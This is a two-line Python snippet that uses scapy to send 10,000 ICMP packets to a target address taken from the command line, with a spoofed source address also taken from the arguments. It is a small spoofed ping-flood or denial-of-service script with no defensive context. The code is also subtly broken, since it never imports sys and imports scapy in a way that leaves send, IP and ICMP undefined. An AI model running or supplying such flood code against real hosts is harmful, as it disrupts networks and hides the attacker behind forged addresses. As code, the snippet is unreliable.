import scapy
send((IP(dst=sys.argv[1],src=sys.argv[2])/ICMP())*10000, iface=sys.argv[3])